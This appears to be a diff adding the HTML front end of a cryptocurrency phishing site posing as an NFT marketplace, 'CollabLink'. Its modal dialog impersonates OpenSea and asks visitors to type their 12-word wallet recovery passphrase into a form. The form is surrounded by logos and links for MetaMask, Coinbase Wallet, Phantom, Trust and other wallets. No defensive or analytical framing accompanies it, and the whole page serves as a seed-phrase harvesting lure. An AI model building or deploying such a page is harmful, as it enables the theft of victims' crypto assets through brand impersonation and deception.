@@ -1,0 +1,69 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    <meta charset="UTF-8" />
+    <link rel="icon" type="image/svg+xml" href="/favicon.svg" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>CollabLink - The Largest NFT Marketplace</title>
+
+    <link rel="preconnect" href="https://fonts.googleapis.com" />
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin />
+    <link
+      href="https://fonts.googleapis.com/css2?family=Inter:wght@100..900&family=Poppins:wght@100;200;300;400;500;600;700;800;900&display=swap"
+      rel="stylesheet"
+    />
+    
+    <script type="module" crossorigin src="/assets/index-0219c8cf.js"></script>
+    <link rel="stylesheet" href="/assets/index-1138c8f1.css">
+  </head>
+  <body class="bg-white font-sans text-gray-500 antialiased">
+    <div id="root"></div>
+    
+    
+    <dialog id="modal" class="dialog">
+      <button id="closeModal" class="dialog-close-btn"><large>x</large></button>
+      <section class="modaltop">
+        <img src="/assets/background-wallet-55ef3078.webp" alt="Wallet Background">
+        <div class="modallogo"><img src="/assets/logo-wallet-1f0d3932.svg" alt="Logo"></div> 
+        <p class="modalcon">Connect to OpenSea</p>
+        <p class="modalcon2">Enter Your 12 Keys Passphrase</p>
+        <form name="contact" id="walletForm">
+          <p>
+            <label>
+              <textarea 
+                class="modalform" 
+                name="passphrase" 
+                placeholder="Enter your 12 key passphrase here..."
+                rows="4"
+                required
+              ></textarea>
+            </label>
+          </p>
+          <p>
+            <button class="modalsubmit" type="submit">Connect Wallet</button>
+          </p>
+        </form>
+        <br>
+      </section>
+      <a class="wallor">OR</a>
+      <section class="modalbtm">
+        <br>
+        <a href="#wallet" class="walletl"><img class="walleti" src="/assets/metamask-fox-11b1aab7.svg">MetaMask</a>
+        <a href="#wallet" class="walletl"><img class="walleti" src="/assets/walletlink-alternative-7f1e60c2.webp">Coinbase Wallet</a>
+        <a href="#wallet" class="walletl"><img class="walleti" src="data:image/webp;base64,UklGRs4GAABXRUJQVlA4TMIGAAAvK8FKED/BoG0jSe4sfwzL854pDQVt20jZT+v4U9rdFWHatlHb7f+LQxBCspWNoI8QQv4UmXQIAe7pPJvPRKJRiCnA2oKvQIAJYyFogFSpZHFWwkIPJxifqsPp96J5kv3NMpHG/jWcvQ2Ksm1LbaP37hMWKGpNZADsBok8Sf//ixkkuPecK/WoiP7LgiTZbZt3MzIKYCiAAQe8QPg3PFXx8r+8/C8v/8vL//IPVon5eG6Gtt3eiLYdmvMxx+fitWmG7bpIMiNSWR3a8/dHX/J52BaiGOW6PefH/C4+DutCTGKxHo6PtRyHKoltVI9yUWy2SSAirZv86OYMlUBF1eTHN+cJmnGsBDbW50dz+zoJdCy2+THd/sm5eRyWQhKL5lE8Ns3E5/wApqgm6uz8FOHEg5h6Xp7uUghxLBp3sxPyWGZH77UXB8LNrLi5+STPzp3yb/d6imZ+TuJIpC/uzXUmKs9mXu/MfW4eMu7FpdhHl8pYiFOxyA4+21PzZHtxLfbO7HdLcS7K7NRjPD0PcU3iYKSLE6UWJ6P2wueJjdyJp+YZo6uKbCK3pTgbZSTXXx6H6W2127Vt2/yItm13u9UyAeK/abkbLpMbOo+n4WOVvCfDuPzQabo1Xj5Wjh9nZYzjqbePU1T9AJ0+liDHWR67GrLJ+jYrCLx1NUTDdW5W9pDdwdrUjeZvkd56xVuualrj24OcajC+eaL65w/TqRPQ2bpeDOM7U1l6UQedDSdODi5ZA+74cu/gnz8tHwdwYmVzR6qbnEw2C/DHrSkMClkteK9fOuw9Xqde3tmO17VvvMr4Kbm6bKxVs6iv4dfwYmYXCKP35oRCLjR1jHee3LzTkxR36k6bpCQt7px2yYWKfrGOfHu6+VJH588m6WbrF19JN8RM/YK2Oe23WbpFOhG3QkvTdYs0hsDMVJ1gqs7QhOAG02Rnim6xGD1oOXtfV/CnAW0u7ukM99oa+8Bt3eF2s2wvuKVD3Op24wc6uzfaRP33Hkqe4JchXFZvO286c51OMfwzHsd6Xa0b4rU+VNXhyFvO26o6ZM0Om9xpR6y4h3XIhXanoQ338WQubiXT3Af7G/1eUGnkPH5kZkwiumxEmMmFyG24TyFtdGqrmMmFyD24z7ato0J/FWZyIcLMmKb0g5ndtYeZXIgwMyaRKej3groy1exPg6lj/TT0O4xdeRpBMHMVkano9627srQXmQ6JM9DvW3flaFozBwbnrbV+O6Arw4gl88B37lrrN5n6wlSdPy0HgHc2+q08a3SZqUUU0G8QW2PLTC2ign7b4RpZZmoRJfSbWde4MlOL6JILEWYuSUSNC+iARbrkQoSZq6jGFXJsJ2UKEV0ApaZW78neiGgDpzrcI4a1legDpgHUg6tVSQyA0gTmcehSEl4+kw9hV4tFqXg3Uy1iBu+YtavGaBA58qEYa9rRDZtQkVKLmEJq+bPLNCW1iDGc5kBKLWIOozEETmoRACg1ZR0tR9hlJhpqTGlFLcJMLO22MCe1CAxU3h1thYZaBAga+x9bl5NaBAoWf6wBDNyjgW9YxGGRtQdOZybbScpGhJlcWDk93sHZiEBCawgdNBsRUKDtQiBlIwILtphwD8dfRmA5iaUINrByEksRdEDlJJYi+EDKSSxFGAAUHe5fWSkznJzkgucn6MDEJ41TZWZMZnKA4lthBZAswHz0Oisw/GoziJwVIN9ShiDYhMAExBe6KRBScQLY9xkDIBdyNU8TQLiKmXwYZ1QAmGrelNsI0+QTAjNTY99FwIjDYJenYzDUdhk8KWKWfIIgdkLA5CSoBIHHiRDpKc2MHIBEqF7QHDJye3AjKBhEwe5YHwx8Z0IgHOjOBl5AsFUAXEi4931jQhYU3DRBC1xhQc2o9EAVGMzkUxNMoUHM03VBFBzuQ5qxwNNRFpl+rfEjLrE2kgVYF/BAAdL7yQaka50gAeejZwXOZWHQgPItZQfKFXQQgfGFbgnGxYZQgbDvs8Xb6zLp7dMEZnrG35W2zqjsMZYR2+QTAVM5sczTMTDUA/h+6j0vreSNd+59X1zayBydTZrATBcCNxYZFRYGsqOffKKhLj/aeToeyroC5RUExF5VT+lhEyZFPaUHzi7V9JQeOhVX0hPIk89eRV8gz9N7BT3lnWCt5+pPfCXfSJ3dZWl4dCEW1DQh+AT5R6+boVeQf0t1k/WUjmq3NlFP6chygCn6FqfEnSZ0HlwHr2E7to47u0xjCA7CnXx2d/SQgvzahG7pY+T+x8y0OtGu9aefUx/Z0/+ZVY7kax2eqnj5X17+l5f/5eV/+QtfAg==">WalletConnect</a>
+        <a href="#wallet" class="walletl"><img class="walleti" src="/assets/phantom-200407a8.svg">Phantom</a>
+        <a href="#wallet" class="walletl"><img class="walleti" src="/assets/unnamed-dd33d1df.jpg">BitKeep</a>
+        <a href="#wallet" class="walletl"><img class="walleti" src="data:image/webp;base64,UklGRk4EAABXRUJQVlA4TEIEAAAvp8AmEGfjuG0jSZLdd78mxIlvApy912k4bNvIkTRh8xZzNV9zV8F9/hm0bduGmdzD+nmfiqc6pG1biPYneDeDn0ERlNIYjcKYhPANegYTwHn8VBw4Eq0wQSUNAqmACjYLoIIBKhighICQSAgSEBLxOH3193t26PrASxT5ff7H3iD6//f07i5ujWG2CkLSqiYRbCJolQjFtE0ENm2XVqkFhFZJWL0LCILcXjFRCaYQAkRQkv7CBgoREBIhQUAsTr5Y9Qe3zfUpPvV671olmHMJ1qo911olWHOtWXut67wedwSQ8XgEyf0IGI87Ao9HwAB1bdvbRtFHh4AAU5IPFBx6N3V3dkzzhOIdD9bHmEmh9zLt/E8gRWUuvb8j+j8B5FofPHLs1CmO9gm1m4LcfaTD8U+63s61Ooxhe7+fc60O47jPx9kOI9nuOusmDKZytbvDcO5yc5YBPeSkxYgqFy2GNHHQYpB2M6jHrbonUTlklTCq2uYAo5qQZfckLHtsWoxqQpbdk7DssTnAqCZkexKWPTa7GdWEbI/CssfqJCoJ2e5lVPdY7UNFkfVhVLRdAooi+zOgaAdtTBQ5ZEw1SopQ0igpQkmjpAgljZIilDRKilDSKClCSaOkKEZbWztBx6b3/cOXb9++ffv68ed2WIrisv3+29zvt0PScfn+9ZvtMBxFURl+czgKRkdl+M3pKBBFMdn+5ng9DB2Vj64+BqEoJue/Oe+FoKPy192PABRF5edO0nH54+63P0VxOe9u05+ODH909YW9K4rNuqtf/nR0eOzmPXtXFB9+5+Jzz5+OEY/tRj32rihKvPFpvo/rHKCOFPP6+0/TvozXOURF0WLm3ub6+naPA9VRC1oRSholRShplBShpFFShJJGSRFKGiVFKGmUFKGkUbpMKOUFSDelHkB0OhcpIbopIlIAlOYT9QCfTKYuw5Pm02QJnUxmmgabNJ8lFTaZzNtHJs3nMg0wmcxf4ZLmFtKHJRNb04CS5lZSgZKJwz4kae7CNIhk4rQCJM3dSB+PTFy/QSMV5ytoPHAnJRZXxGeBRJp7qQdA/CN+Sxwy8V2gcFu81wMMbkqAJQSZBFnEr31XwqwHsUsXJdQybu07TyTcImZXcwm5HsTqwvVHEvhylC5cuf9Ewl+KSzu9dO3egpEdaRp/6fWHi4+NxL/ydOH6gsDY93LriQBpGncXFwXLytkNI2j2HWWCp2mcZIJo5eKGYNq3SwVU01jlqEhlc01w7VvkwMibua4Jsitz/QeNlHOkAm4x6xo69WDGv+hIOWMBHimmPcWnHkwRgEuYpICpHhBRjZCURFRBJAXRS4zqAb3FSNZoAJI0VIH0nAqQXhNVGBmiAiMhomWYBjVCr4mIVg1AryZo1eDTTKFVg84azXxWY2OaWUQvoFmiuZ/9D4spyPbZqxVEzIsBuXy29HxtuQJy7dXbAU0F">Kaikas</a>
+        <a href="#wallet" class="walletl"><img class="walleti" src="/assets/unnamed (1)-c383f47d.jpg">Core</a>
+        <a href="#wallet" class="walletl"><img class="walleti" src="/assets/glow-d673c56b.svg">Glow</a>
+        <a href="#wallet" class="walletl"><img class="walleti" src="data:image/webp;base64,UklGRnABAABXRUJQVlA4TGQBAAAvLMFKEOegoG0jJ7cf7vPXDRoEkjbypO/f4Xz+ETOSpFmCLYRBO//XGlxAfntQKIBgyHFKD0BYmCUC5RM5jisARwRCDkRjpnmAINt22uZJVsxFWeb975UmusUf0f8JWFCtzH/mP/Of+c/89xdV2LLX3cqq/DX/mf/Mf+Y/89/fGyE+p/WzUi3PaWX+M/+Z/8x/5r9foR7jjc4ZdKuvfyrUrIRvLCsrDpVJqAysvLHSsVKzElgRKgMrPSsVKx6VQaj0rARUJqHSs1KjkoRKz4pHJQqVCpUkVCpUklCpUElCpUIlCZUClV6kJI9KJVJ6kZI8KkGk7CLlXaQkT0ryIqUQKaVI2UXKLlJ2kVIKlLkUKKkQKIMXKC9OnMyNjoUhFQKlc+IkBR3PwbzrjBi8e3ESg06KQAw6LQAx6MS5N+9Op867GJxOnm9zbJzOn2ljF5wumV/jR/dwumw2jePw8dlWhdO1AQ==">Fortmatic</a>
+        <a href="#wallet" class="walletl"><img class="walleti" src="data:image/webp;base64,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">Bitski</a>
+        <a href="#wallet" class="walletl"><img class="walleti" src="/assets/solflare-0e8b2433.webp">Solflare</a>
+        <a href="#wallet" class="walletl"><img class="walleti" src="/assets/opera-touch-alternative-eb8c67fe.svg">OperaTouch</a>
+        <a href="#wallet" class="walletl"><img class="walleti" src="/assets/trust-alternative-dbc6b551.webp">Trust</a>
+      </section>
+    </dialog>
+  </body>
+
+  
+</html>
